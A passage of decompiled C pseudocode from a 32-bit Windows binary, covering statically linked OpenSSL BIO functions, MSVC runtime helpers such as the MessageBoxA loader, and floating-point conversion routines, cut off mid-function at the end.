LABEL_47:
      *(_DWORD *)(v4 + 24) = 0;
      *(_DWORD *)(v4 + 28) = 0;
      return sub_405390((_DWORD *)a1[9], a2, Size, (int)Src);
    }
  }
  return v5;
}

//----- (004D9AB0) --------------------------------------------------------
int __cdecl sub_4D9AB0(int a1, int a2, int a3)
{
  int (__cdecl *v3)(_DWORD *, int, int *, int, _DWORD, int); // edi
  int result; // eax
  _DWORD *v5; // [esp+4h] [ebp+4h]

  result = *(_DWORD *)(a1 + 36);
  if ( result )
  {
    v5 = *(_DWORD **)(a1 + 36);
    if ( v5 )
    {
      if ( *v5 && *(_DWORD *)(*v5 + 36) )
      {
        v3 = (int (__cdecl *)(_DWORD *, int, int *, int, _DWORD, int))v5[1];
        if ( !v3 || (result = v3(v5, 6, &a3, a2, 0, 1), result > 0) )
        {
          result = (*(int (__cdecl **)(_DWORD *, int, int))(*v5 + 36))(v5, a2, a3);
          if ( v3 )
            return v3(v5, 134, &a3, a2, 0, result);
        }
      }
      else
      {
        sub_408310(32, 131, 121, "crypto\\bio\\bio_lib.c", 364);
        return -2;
      }
    }
    else
    {
      return 0;
    }
  }
  return result;
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (004D9AD0) --------------------------------------------------------
int __cdecl sub_4D9AD0(_DWORD *a1, _BYTE *a2, int a3)
{
  int *v3; // esi
  int v4; // ebx
  int v6; // ecx
  int v7; // ecx
  int v8; // edi
  int v9; // eax
  int result; // eax
  int v11; // edi
  int v12; // [esp+10h] [ebp-4h]

  v3 = (int *)a1[8];
  v12 = 0;
  v4 = a3 - 1;
  sub_405010((int)a1, 15);
  while ( 1 )
  {
    while ( 1 )
    {
      v6 = v3[2];
      if ( v3[3] <= 0 )
        break;
      v7 = v3[4] + v6;
      v8 = 0;
      v9 = 0;
      while ( v9 < v4 )
      {
        *a2++ = *(_BYTE *)(v9 + v7);
        if ( *(_BYTE *)(v9 + v7) == 10 )
        {
          v8 = 1;
          ++v9;
          break;
        }
        if ( ++v9 >= v3[3] )
          break;
      }
      v12 += v9;
      v3[3] -= v9;
      v3[4] += v9;
      v4 -= v9;
      if ( v8 || !v4 )
      {
        *a2 = 0;
        return v12;
      }
    }
    v11 = sub_405040(a1[9], v6, *v3);
    if ( v11 <= 0 )
      break;
LABEL_17:
    v3[3] = v11;
    v3[4] = 0;
  }
  sub_405580(a1);
  *a2 = 0;
  if ( v11 >= 0 )
  {
    if ( !v11 )
      return v12;
    goto LABEL_17;
  }
  result = v12;
  if ( v12 <= 0 )
    return v11;
  return result;
}

//----- (004D9BB0) --------------------------------------------------------
int __cdecl sub_4D9BB0(_DWORD *a1, char *Src)
{
  return sub_4D94E0(a1, Src, strlen(Src));
}

//----- (004D9BE0) --------------------------------------------------------
void *sub_4D9BE0()
{
  return &unk_52D81C;
}

//----- (004D9BF0) --------------------------------------------------------
void *sub_4D9BF0()
{
  return &unk_52D84C;
}

//----- (004D9C00) --------------------------------------------------------
void *sub_4D9C00()
{
  return &unk_52D8D8;
}

//----- (004D9C10) --------------------------------------------------------
void *sub_4D9C10()
{
  return &unk_52D998;
}

//----- (004D9C20) --------------------------------------------------------
void *sub_4D9C20()
{
  return &unk_52D9F0;
}

//----- (004DA3E6) --------------------------------------------------------
void **sub_4DA3E6()
{
  return &off_5356E0;
}
// 5356E0: using guessed type void *off_5356E0;

//----- (004DC8ED) --------------------------------------------------------
int sub_4DC8ED()
{
  return _decode_pointer(dword_539468);
}
// 4E3EBC: using guessed type _DWORD __cdecl _decode_pointer(_DWORD);
// 539468: using guessed type int dword_539468;

//----- (004DD1FE) --------------------------------------------------------
int sub_4DD1FE()
{
  return flsall(1);
}
// 4DD0D1: using guessed type _DWORD __cdecl flsall(_DWORD);

//----- (004DD2C3) --------------------------------------------------------
int __cdecl sub_4DD2C3(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_539DA4;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter(0, 0, 0, 0, 0);
    return 22;
  }
}
// 4DFB6E: using guessed type int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 539DA4: using guessed type int dword_539DA4;

//----- (004DFA37) --------------------------------------------------------
int __cdecl sub_4DFA37(int a1)
{
  int result; // eax

  result = a1;
  dword_53979C = a1;
  return result;
}
// 53979C: using guessed type int dword_53979C;

//----- (004E1457) --------------------------------------------------------
int __cdecl sub_4E1457(int a1)
{
  int result; // eax

  result = a1;
  dword_539C14 = a1;
  return result;
}
// 539C14: using guessed type int dword_539C14;

//----- (004E4CA9) --------------------------------------------------------
void *sub_4E4CA9()
{
  return &unk_52F974;
}

//----- (004E4CCF) --------------------------------------------------------
void __cdecl sub_4E4CCF()
{
  ;
}

//----- (004E5018) --------------------------------------------------------
int __cdecl sub_4E5018(int a1)
{
  int result; // eax

  result = a1;
  dword_539C80 = a1;
  return result;
}
// 539C80: using guessed type int dword_539C80;

//----- (004E5027) --------------------------------------------------------
int __cdecl sub_4E5027(int a1)
{
  int result; // eax

  result = a1;
  dword_539C8C = a1;
  return result;
}
// 539C8C: using guessed type int dword_539C8C;

//----- (004E5036) --------------------------------------------------------
int __cdecl sub_4E5036(int a1)
{
  int result; // eax

  result = a1;
  dword_539C90 = a1;
  return result;
}
// 539C90: using guessed type int dword_539C90;

//----- (004E50E7) --------------------------------------------------------
int sub_4E50E7()
{
  SetUnhandledExceptionFilter(__CxxUnhandledExceptionFilter);
  return 0;
}

//----- (004E5811) --------------------------------------------------------
int sub_4E5811()
{
  dword_73C6E4 = _get_sse2_info();
  return 0;
}
// 4E57AF: using guessed type int _get_sse2_info(void);
// 73C6E4: using guessed type int dword_73C6E4;

//----- (004E8749) --------------------------------------------------------
void *sub_4E8749()
{
  return &unk_536538;
}

//----- (004E874F) --------------------------------------------------------
char **sub_4E874F()
{
  return off_536488;
}
// 536488: using guessed type char *off_536488[44];

//----- (004E8CC1) --------------------------------------------------------
void sub_4E8CC1()
{
  dword_73C6E0 = 0;
}
// 73C6E0: using guessed type int dword_73C6E0;

//----- (004E9BA0) --------------------------------------------------------
int __cdecl sub_4E9BA0(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_5365CC;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter(0, 0, 0, 0, 0);
    return 22;
  }
}
// 4DFB6E: using guessed type int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 5365CC: using guessed type int dword_5365CC;

//----- (004E9BD9) --------------------------------------------------------
int __cdecl sub_4E9BD9(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_5365D0;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter(0, 0, 0, 0, 0);
    return 22;
  }
}
// 4DFB6E: using guessed type int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 5365D0: using guessed type int dword_5365D0;

//----- (004E9C12) --------------------------------------------------------
int __cdecl sub_4E9C12(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_5365C8;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter(0, 0, 0, 0, 0);
    return 22;
  }
}
// 4DFB6E: using guessed type int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 5365C8: using guessed type int dword_5365C8;

//----- (004E9C4B) --------------------------------------------------------
int *sub_4E9C4B()
{
  return &dword_5365CC;
}
// 5365CC: using guessed type int dword_5365CC;

//----- (004E9C51) --------------------------------------------------------
int *sub_4E9C51()
{
  return &dword_5365D0;
}
// 5365D0: using guessed type int dword_5365D0;

//----- (004E9C57) --------------------------------------------------------
int *sub_4E9C57()
{
  return &dword_5365C8;
}
// 5365C8: using guessed type int dword_5365C8;

//----- (004E9C5D) --------------------------------------------------------
void ***sub_4E9C5D()
{
  return off_536658;
}
// 536658: using guessed type void **off_536658[2];

//----- (004E9CB0) --------------------------------------------------------
int __cdecl sub_4E9CB0(int a1, int a2, int a3)
{
  int v3; // ebx
  HMODULE LibraryA; // eax
  HMODULE v5; // edi
  int (__stdcall *MessageBoxA)(HWND, LPCSTR, LPCSTR, UINT); // eax
  HWND (__stdcall *GetActiveWindow)(); // eax
  HWND (__stdcall *GetLastActivePopup)(HWND); // eax
  BOOL (__stdcall *GetUserObjectInformationA)(HANDLE, int, PVOID, DWORD, LPDWORD); // eax
  HWINSTA (__stdcall *GetProcessWindowStation)(); // eax
  int (*v11)(void); // esi
  int (__stdcall *v12)(int, int, char *, int, char *); // eax
  int (__stdcall *v13)(int, int, char *, int, char *); // edi
  int v14; // eax
  int (*v15)(void); // eax
  int (__stdcall *v16)(int); // eax
  int (__stdcall *v17)(int, int, int, int); // eax
  char v19[12]; // [esp+10h] [ebp-14h] BYREF
  char v20[4]; // [esp+1Ch] [ebp-8h] BYREF
  int v21; // [esp+20h] [ebp-4h]

  v21 = 0;
  v3 = _encoded_null();
  if ( !dword_539E60 )
  {
    LibraryA = LoadLibraryA("USER32.DLL");
    v5 = LibraryA;
    if ( !LibraryA )
      return 0;
    MessageBoxA = (int (__stdcall *)(HWND, LPCSTR, LPCSTR, UINT))GetProcAddress(LibraryA, "MessageBoxA");
    if ( !MessageBoxA )
      return 0;
    dword_539E60 = _encode_pointer(MessageBoxA);
    GetActiveWindow = (HWND (__stdcall *)())GetProcAddress(v5, "GetActiveWindow");
    dword_539E64 = _encode_pointer(GetActiveWindow);
    GetLastActivePopup = (HWND (__stdcall *)(HWND))GetProcAddress(v5, "GetLastActivePopup");
    dword_539E68 = _encode_pointer(GetLastActivePopup);
    GetUserObjectInformationA = (BOOL (__stdcall *)(HANDLE, int, PVOID, DWORD, LPDWORD))GetProcAddress(
                                                                                          v5,
                                                                                          "GetUserObjectInformationA");
    dword_539E70 = _encode_pointer(GetUserObjectInformationA);
    if ( dword_539E70 )
    {
      GetProcessWindowStation = (HWINSTA (__stdcall *)())GetProcAddress(v5, "GetProcessWindowStation");
      dword_539E6C = _encode_pointer(GetProcessWindowStation);
    }
  }
  if ( dword_539E6C == v3
    || dword_539E70 == v3
    || (v11 = (int (*)(void))_decode_pointer(dword_539E6C),
        v12 = (int (__stdcall *)(int, int, char *, int, char *))_decode_pointer(dword_539E70),
        v13 = v12,
        !v11)
    || !v12
    || (v14 = v11()) != 0 && v13(v14, 1, v19, 12, v20) && (v19[8] & 1) != 0 )
  {
    if ( dword_539E64 != v3 )
    {
      v15 = (int (*)(void))_decode_pointer(dword_539E64);
      if ( v15 )
      {
        v21 = v15();
        if ( v21 )
        {
          if ( dword_539E68 != v3 )
          {
            v16 = (int (__stdcall *)(int))_decode_pointer(dword_539E68);
            if ( v16 )
              v21 = v16(v21);
          }
        }
      }
    }
  }
  else
  {
    a3 |= 0x200000u;
  }
  v17 = (int (__stdcall *)(int, int, int, int))_decode_pointer(dword_539E60);
  if ( v17 )
    return v17(v21, a1, a2, a3);
  return 0;
}
// 4E3E41: using guessed type _DWORD __cdecl _encode_pointer(_DWORD);
// 4E3EB3: using guessed type int _encoded_null(void);
// 4E3EBC: using guessed type _DWORD __cdecl _decode_pointer(_DWORD);
// 539E60: using guessed type int dword_539E60;
// 539E64: using guessed type int dword_539E64;
// 539E68: using guessed type int dword_539E68;
// 539E6C: using guessed type int dword_539E6C;
// 539E70: using guessed type int dword_539E70;
// 4E9CB0: using guessed type char var_8[4];

//----- (004EBEB2) --------------------------------------------------------
int __cdecl sub_4EBEB2(_DWORD *a1, int a2, struct localeinfo_struct *a3)
{
  int v3; // eax
  char v6[4]; // [esp+Ch] [ebp-28h] BYREF
  char v7[8]; // [esp+10h] [ebp-24h] BYREF
  int v8; // [esp+18h] [ebp-1Ch]
  char v9; // [esp+1Ch] [ebp-18h]
  int v10; // [esp+20h] [ebp-14h]
  unsigned __int16 v11[6]; // [esp+24h] [ebp-10h] BYREF

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v7, a3);
  v10 = __strgtold12_l(v11, v6, a2, 0, 0, 0, 0, v7);
  v3 = sub_4ED2B9(v11, a1);
  if ( (v10 & 3) != 0 )
  {
    if ( (v10 & 1) != 0 )
      goto LABEL_8;
    if ( (v10 & 2) != 0 )
      goto LABEL_3;
  }
  else
  {
    if ( v3 == 1 )
    {
LABEL_3:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 3;
    }
    if ( v3 == 2 )
    {
LABEL_8:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 4;
    }
  }
  if ( v9 )
    *(_DWORD *)(v8 + 112) &= ~2u;
  return 0;
}
// 4EDD41: using guessed type _DWORD __cdecl __strgtold12_l(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4EBEB2: using guessed type char var_28[4];
// 4EBEB2: using guessed type unsigned __int16 var_10[6];

//----- (004EBF5A) --------------------------------------------------------
int __cdecl sub_4EBF5A(_DWORD *a1, int a2, struct localeinfo_struct *a3)
{
  int v3; // eax
  char v6[4]; // [esp+Ch] [ebp-28h] BYREF
  char v7[8]; // [esp+10h] [ebp-24h] BYREF
  int v8; // [esp+18h] [ebp-1Ch]
  char v9; // [esp+1Ch] [ebp-18h]
  int v10; // [esp+20h] [ebp-14h]
  unsigned __int16 v11[6]; // [esp+24h] [ebp-10h] BYREF

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v7, a3);
  v10 = __strgtold12_l(v11, v6, a2, 0, 0, 0, 0, v7);
  v3 = sub_4ED7FD(v11, a1);
  if ( (v10 & 3) != 0 )
  {
    if ( (v10 & 1) != 0 )
      goto LABEL_8;
    if ( (v10 & 2) != 0 )
      goto LABEL_3;
  }
  else
  {
    if ( v3 == 1 )
    {
LABEL_3:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 3;
    }
    if ( v3 == 2 )
    {
LABEL_8:
      if ( v9 )
        *(_DWORD *)(v8 + 112) &= ~2u;
      return 4;
    }
  }
  if ( v9 )
    *(_DWORD *)(v8 + 112) &= ~2u;
  return 0;
}
// 4EDD41: using guessed type _DWORD __cdecl __strgtold12_l(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4EBF5A: using guessed type char var_28[4];
// 4EBF5A: using guessed type unsigned __int16 var_10[6];

//----- (004ECDBF) --------------------------------------------------------
int __cdecl sub_4ECDBF(int a1, LPCWSTR lpFileName, int a3, int a4, int a5)
{
  return _sopen_helper_0(lpFileName, a3, a4, a5, a1, 1);
}

//----- (004ED2B9) --------------------------------------------------------
int __cdecl sub_4ED2B9(unsigned __int16 *a1, _DWORD *a2)
{
  unsigned __int16 v2; // bx
  int v3; // ebx
  int v4; // eax
  int v5; // ebx
  int v6; // eax
  int result; // eax
  int v8; // esi
  int *v9; // edi
  int v10; // eax
  bool i; // zf
  int v12; // eax
  unsigned int v13; // edx
  int *v14; // ecx
  bool v15; // cf
  unsigned int v16; // esi
  int v17; // eax
  int v18; // edx
  int *v19; // ebx
  unsigned int v20; // esi
  char v21; // cl
  int v22; // edx
  int *v23; // ecx
  int v24; // esi
  int v25; // eax
  int *v26; // ebx
  bool j; // zf
  int v28; // eax
  unsigned int v29; // edx
  int *v30; // ecx
  unsigned int v31; // edi
  int k; // ecx
  int *v33; // ecx
  unsigned int v34; // esi
  int v35; // edi
  int v36; // eax
  int v37; // edx
  int *v38; // ebx
  unsigned int v39; // esi
  char v40; // cl
  int v41; // edx
  int *v42; // ecx
  int v43; // eax
  int v44; // edx
  int *v45; // ebx
  unsigned int v46; // esi
  char v47; // cl
  int v48; // edx
  int *v49; // ecx
  int v50; // eax
  int v51; // edx
  unsigned int v52; // edi
  int v53; // edx
  int *v54; // ecx
  unsigned int v55; // ebx
  int v56; // edx
  int v57; // [esp+8h] [ebp-2Ch]
  int v58; // [esp+Ch] [ebp-28h]
  int v59; // [esp+10h] [ebp-24h]
  int v60; // [esp+14h] [ebp-20h] BYREF
  int v61; // [esp+18h] [ebp-1Ch]
  int v62; // [esp+1Ch] [ebp-18h] BYREF
  int v63; // [esp+20h] [ebp-14h]
  int v64; // [esp+24h] [ebp-10h]
  int v65; // [esp+28h] [ebp-Ch]
  int v66; // [esp+2Ch] [ebp-8h]
  int v67; // [esp+30h] [ebp-4h]
  int v68; // [esp+3Ch] [ebp+8h]
  unsigned int v69; // [esp+3Ch] [ebp+8h]
  int v70; // [esp+3Ch] [ebp+8h]
  int v71; // [esp+3Ch] [ebp+8h]
  int v72; // [esp+3Ch] [ebp+8h]
  int v73; // [esp+3Ch] [ebp+8h]
  int v74; // [esp+3Ch] [ebp+8h]

  v2 = a1[5];
  v63 = v2 & 0x8000;
  v60 = *(_DWORD *)(a1 + 3);
  v3 = (v2 & 0x7FFF) - 0x3FFF;
  v4 = *a1 << 16;
  v61 = *(_DWORD *)(a1 + 1);
  v62 = v4;
  if ( v3 != -16383 )
  {
    v68 = 0;
    v57 = v60;
    v58 = v61;
    v59 = v62;
    v8 = dword_5367A0 - 1;
    v64 = v3;
    v65 = dword_5367A0 / 32;
    v9 = &v60 + dword_5367A0 / 32;
    v66 = 31 - dword_5367A0 % 32;
    if ( ((1 << (31 - dword_5367A0 % 32)) & *v9) != 0 )
    {
      v10 = v65;
      for ( i = (~(-1 << (31 - dword_5367A0 % 32)) & *(&v60 + v65)) == 0; i; i = *(&v60 + v10) == 0 )
      {
        if ( ++v10 >= 3 )
          goto LABEL_22;
      }
      v12 = v8 / 32;
      v67 = 0;
      v13 = 1 << (31 - v8 % 32);
      v14 = &v60 + v8 / 32;
      v69 = v13 + *v14;
      if ( v69 >= *v14 )
      {
        v15 = v69 < v13;
        goto LABEL_18;
      }
LABEL_19:
      v67 = 1;
      while ( 1 )
      {
        --v12;
        *v14 = v69;
        if ( v12 < 0 || !v67 )
          break;
        v67 = 0;
        v14 = &v60 + v12;
        v16 = *v14 + 1;
        v69 = v16;
        if ( v16 >= *v14 )
        {
          v15 = v16 == 0;
LABEL_18:
          if ( !v15 )
            continue;
        }
        goto LABEL_19;
      }
      v68 = v67;
    }
LABEL_22:
    *v9 &= -1 << v66;
    if ( v65 + 1 < 3 )
      memset(&v60 + v65 + 1, 0, 4 * (3 - (v65 + 1)));
    if ( v68 )
      ++v3;
    if ( v3 >= dword_53679C - dword_5367A0 )
    {
      if ( v3 > dword_53679C )
      {
        if ( v3 < dword_536798 )
        {
          v60 &= ~0x80000000;
          v5 = dword_5367AC + v3;
          v50 = dword_5367A4 / 32;
          v51 = dword_5367A4 % 32;
          v65 = 0;
          v74 = 0;
          v67 = 32 - dword_5367A4 % 32;
          do
          {
            v52 = *(&v60 + v74);
            v64 = ~(-1 << v51) & v52;
            *(&v60 + v74++) = v65 | (v52 >> v51);
            v65 = v64 << v67;
          }
          while ( v74 < 3 );
          v53 = 2;
          v54 = &v62 - v50;
          do
          {
            if ( v53 < v50 )
              *(&v60 + v53) = 0;
            else
              *(&v60 + v53) = *v54;
            --v53;
            --v54;
          }
          while ( v53 >= 0 );
          result = 0;
        }
        else
        {
          v61 = 0;
          v62 = 0;
          v60 = 0x80000000;
          v43 = dword_5367A4 / 32;
          v44 = dword_5367A4 % 32;
          v65 = 0;
          v73 = 0;
          v67 = 32 - dword_5367A4 % 32;
          do
          {
            v45 = &v60 + v73;
            v46 = *v45;
            v64 = ~(-1 << v44) & *v45;
            v47 = v67;
            *v45 = v65 | (v46 >> v44);
            ++v73;
            v65 = v64 << v47;
          }
          while ( v73 < 3 );
          v48 = 2;
          v49 = &v62 - v43;
          do
          {
            if ( v48 < v43 )
              *(&v60 + v48) = 0;
            else
              *(&v60 + v48) = *v49;
            --v48;
            --v49;
          }
          while ( v48 >= 0 );
          v5 = dword_5367AC + dword_536798;
          result = 1;
        }
        goto LABEL_79;
      }
      v60 = v57;
      v61 = v58;
      v17 = (dword_53679C - v64) / 32;
      v62 = v59;
      v18 = (dword_53679C - v64) % 32;
      v65 = 0;
      v70 = 0;
      v67 = 32 - v18;
      do
      {
        v19 = &v60 + v70;
        v20 = *v19;
        v64 = ~(-1 << v18) & *v19;
        v21 = v67;
        *v19 = v65 | (v20 >> v18);
        ++v70;
        v65 = v64 << v21;
      }
      while ( v70 < 3 );
      v22 = 2;
      v23 = &v62 - v17;
      do
      {
        if ( v22 < v17 )
          *(&v60 + v22) = 0;
        else
          *(&v60 + v22) = *v23;
        --v22;
        --v23;
      }
      while ( v22 >= 0 );
      v24 = dword_5367A0 - 1;
      v25 = dword_5367A0 / 32;
      v65 = dword_5367A0 / 32;
      v26 = &v60 + dword_5367A0 / 32;
      v64 = 31 - dword_5367A0 % 32;
      if ( ((1 << (31 - dword_5367A0 % 32)) & *v26) != 0 )
      {
        for ( j = (~(-1 << (31 - dword_5367A0 % 32)) & *(&v60 + v25)) == 0; j; j = *(&v60 + v25) == 0 )
        {
          if ( ++v25 >= 3 )
            goto LABEL_52;
        }
        v28 = v24 / 32;
        v71 = 0;
        v29 = 1 << (31 - v24 % 32);
        v30 = &v60 + v24 / 32;
        v31 = *v30 + v29;
        if ( v31 < *v30 || v31 < v29 )
          v71 = 1;
        *v30 = v31;
        for ( k = v71; --v28 >= 0 && k; k = v35 )
        {
          v33 = &v60 + v28;
          v34 = *v33 + 1;
          v35 = 0;
          if ( v34 < *v33 || *v33 == -1 )
            v35 = 1;
          *v33 = v34;
        }
      }
LABEL_52:
      *v26 &= -1 << v64;
      if ( v65 + 1 < 3 )
        memset(&v60 + v65 + 1, 0, 4 * (3 - (v65 + 1)));
      v36 = (dword_5367A4 + 1) / 32;
      v37 = (dword_5367A4 + 1) % 32;
      v65 = 0;
      v72 = 0;
      v67 = 32 - v37;
      do
      {
        v38 = &v60 + v72;
        v39 = *v38;
        v64 = ~(-1 << v37) & *v38;
        v40 = v67;
        *v38 = v65 | (v39 >> v37);
        ++v72;
        v65 = v64 << v40;
      }
      while ( v72 < 3 );
      v41 = 2;
      v42 = &v62 - v36;
      do
      {
        if ( v41 < v36 )
          *(&v60 + v41) = 0;
        else
          *(&v60 + v41) = *v42;
        --v41;
        --v42;
      }
      while ( v41 >= 0 );
    }
    else
    {
      v60 = 0;
      v61 = 0;
      v62 = 0;
    }
    v5 = 0;
    result = 2;
    goto LABEL_79;
  }
  v5 = 0;
  v6 = 0;
  while ( !*(&v60 + v6) )
  {
    if ( ++v6 >= 3 )
    {
      result = 0;
      goto LABEL_79;
    }
  }
  v60 = 0;
  v61 = 0;
  v62 = 0;
  result = 2;
LABEL_79:
  v55 = v60 | (v63 != 0 ? 0x80000000 : 0) | (v5 << (31 - dword_5367A4));
  if ( dword_5367A8 == 64 )
  {
    v56 = v61;
    a2[1] = v55;
    *a2 = v56;
  }
  else if ( dword_5367A8 == 32 )
  {
    *a2 = v55;
  }
  return result;
}
// 536798: using guessed type int dword_536798;
// 53679C: using guessed type int dword_53679C;
// 5367A0: using guessed type int dword_5367A0;
// 5367A4: using guessed type int dword_5367A4;
// 5367A8: using guessed type int dword_5367A8;
// 5367AC: using guessed type int dword_5367AC;

//----- (004ED7FD) --------------------------------------------------------
int __cdecl sub_4ED7FD(unsigned __int16 *a1, _DWORD *a2)
{
  unsigned __int16 v2; // bx
  int v3; // ebx
  int v4; // eax
  int v5; // ebx
  int v6; // eax
  int result; // eax
  int v8; // esi
  int *v9; // edi
  int v10; // eax
  bool i; // zf
  int v12; // eax
  unsigned int v13; // edx
  int *v14; // ecx
  bool v15; // cf
  unsigned int v16; // esi
  int v17; // eax
  int v18; // edx
  int *v19; // ebx
  unsigned int v20; // esi
  char v21; // cl
  int v22; // edx
  int *v23; // ecx
  int v24; // esi
  int v25; // eax
  int *v26; // ebx
  bool j; // zf
  int v28; // eax
  unsigned int v29; // edx
  int *v30; // ecx
  unsigned int v31; // edi
  int k; // ecx
  int *v33; // ecx
  unsigned int v34; // esi
  int v35; // edi
  int v36; // eax
  int v37; // edx
  int *v38; // ebx
  unsigned int v39; // esi
  char v40; // cl
  int v41; // edx
  int *v42; // ecx
  int v43; // eax
  int v44; // edx
  int *v45; // ebx
  unsigned int v46; // esi
  char v47; // cl
  int v48; // edx
  int *v49; // ecx
  int v50; // eax
  int v51; // edx
  unsigned int v52; // edi
  int v53; // edx
  int *v54; // ecx
  unsigned int v55; // ebx
  int v56; // edx
  int v57; // [esp+8h] [ebp-2Ch]
  int v58; // [esp+Ch] [ebp-28h]
  int v59; // [esp+10h] [ebp-24h]
  int v60; // [esp+14h] [ebp-20h] BYREF
  int v61; // [esp+18h] [ebp-1Ch]
  int v62; // [esp+1Ch] [ebp-18h] BYREF
  int v63; // [esp+20h] [ebp-14h]
  int v64; // [esp+24h] [ebp-10h]
  int v65; // [esp+28h] [ebp-Ch]
  int v66; // [esp+2Ch] [ebp-8h]
  int v67; // [esp+30h] [ebp-4h]
  int v68; // [esp+3Ch] [ebp+8h]
  unsigned int v69; // [esp+3Ch] [ebp+8h]
  int v70; // [esp+3Ch] [ebp+8h]
  int v71; // [esp+3Ch] [ebp+8h]
  int v72; // [esp+3Ch] [ebp+8h]
  int v73; // [esp+3Ch] [ebp+8h]
  int v74; // [esp+3Ch] [ebp+8h]

  v2 = a1[5];
  v63 = v2 & 0x8000;
  v60 = *(_DWORD *)(a1 + 3);
  v3 = (v2 & 0x7FFF) - 0x3FFF;
  v4 = *a1 << 16;
  v61 = *(_DWORD *)(a1 + 1);
  v62 = v4;
  if ( v3 != -16383 )
  {
    v68 = 0;
    v57 = v60;
    v58 = v61;
    v59 = v62;
    v8 = dword_5367B8 - 1;
    v64 = v3;
    v65 = dword_5367B8 / 32;
    v9 = &v60 + dword_5367B8 / 32;
    v66 = 31 - dword_5367B8 % 32;
    if ( ((1 << (31 - dword_5367B8 % 32)) & *v9) != 0 )
    {
      v10 = v65;
      for ( i = (~(-1 << (31 - dword_5367B8 % 32)) & *(&v60 + v65)) == 0; i; i = *(&v60 + v10) == 0 )
      {
        if ( ++v10 >= 3 )
          goto LABEL_22;
      }
      v12 = v8 / 32;
      v67 = 0;
      v13 = 1 << (31 - v8 % 32);
      v14 = &v60 + v8 / 32;
      v69 = v13 + *v14;
      if ( v69 >= *v14 )
      {
        v15 = v69 < v13;
        goto LABEL_18;
      }
LABEL_19:
      v67 = 1;
      while ( 1 )
      {
        --v12;
        *v14 = v69;
        if ( v12 < 0 || !v67 )
          break;
        v67 = 0;
        v14 = &v60 + v12;
        v16 = *v14 + 1;
        v69 = v16;
        if ( v16 >= *v14 )
        {
          v15 = v16 == 0;
LABEL_18:
          if ( !v15 )
            continue;
        }
        goto LABEL_19;
      }
      v68 = v67;
    }
LABEL_22:
    *v9 &= -1 << v66;
    if ( v65 + 1 < 3 )
      memset(&v60 + v65 + 1, 0, 4 * (3 - (v65 + 1)));
    if ( v68 )
      ++v3;
    if ( v3 >= dword_5367B4 - dword_5367B8 )
    {
      if ( v3 > dword_5367B4 )
      {
        if ( v3 < dword_5367B0 )
        {
          v60 &= ~0x80000000;
          v5 = dword_5367C4 + v3;
          v50 = dword_5367BC / 32;
          v51 = dword_5367BC % 32;
          v65 = 0;
          v74 = 0;
          v67 = 32 - dword_5367BC % 32;
          do
          {
            v52 = *(&v60 + v74);
            v64 = ~(-1 << v51) & v52;
            *(&v60 + v74++) = v65 | (v52 >> v51);
            v65 = v64 << v67;
          }
          while ( v74 < 3 );
          v53 = 2;
          v54 = &v62 - v50;
          do
          {
            if ( v53 < v50 )
              *(&v60 + v53) = 0;
            else
              *(&v60 + v53) = *v54;
            --v53;
            --v54;
          }
          while ( v53 >= 0 );
          result = 0;
        }
        else
        {
          v61 = 0;
          v62 = 0;
          v60 = 0x80000000;
          v43 = dword_5367BC / 32;
          v44 = dword_5367BC % 32;
          v65 = 0;
          v73 = 0;
          v67 = 32 - dword_5367BC % 32;
          do
          {
            v45 = &v60 + v73;
            v46 = *v45;
            v64 = ~(-1 << v44) & *v45;
            v47 = v67;
            *v45 = v65 | (v46 >> v44);
            ++v73;
            v65 = v64 << v47;
          }
          while ( v73 < 3 );
          v48 = 2;
          v49 = &v62 - v43;
          do
          {
            if ( v48 < v43 )
              *(&v60 + v48) = 0;
            else
              *(&v60 + v48) = *v49;
            --v48;
            --v49;
          }
          while ( v48 >= 0 );
          v5 = dword_5367C4 + dword_5367B0;
          result = 1;
        }
        goto LABEL_79;
      }
      v60 = v57;
      v61 = v58;
      v17 = (dword_5367B4 - v64) / 32;
      v62 = v59;
      v18 = (dword_5367B4 - v64) % 32;
      v65 = 0;
      v70 = 0;
      v67 = 32 - v18;
      do
      {
        v19 = &v60 + v70;
        v20 = *v19;
        v64 = ~(-1 << v18) & *v19;
        v21 = v67;
        *v19 = v65 | (v20 >> v18);
        ++v70;
        v65 = v64 << v21;
      }
      while ( v70 < 3 );
      v22 = 2;
      v23 = &v62 - v17;
      do
      {
        if ( v22 < v17 )
          *(&v60 + v22) = 0;
        else
          *(&v60 + v22) = *v23;
        --v22;
        --v23;
      }
      while ( v22 >= 0 );
      v24 = dword_5367B8 - 1;
      v25 = dword_5367B8 / 32;
      v65 = dword_5367B8 / 32;
      v26 = &v60 + dword_5367B8 / 32;
      v64 = 31 - dword_5367B8 % 32;
      if ( ((1 << (31 - dword_5367B8 % 32)) & *v26) != 0 )
      {
        for ( j = (~(-1 << (31 - dword_5367B8 % 32)) & *(&v60 + v25)) == 0; j; j = *(&v60 + v25) == 0 )
        {
          if ( ++v25 >= 3 )
            goto LABEL_52;
        }
        v28 = v24 / 32;
        v71 = 0;
        v29 = 1 << (31 - v24 % 32);
        v30 = &v60 + v24 / 32;
        v31 = *v30 + v29;
        if ( v31 < *v30 || v31 < v29 )
          v71 = 1;
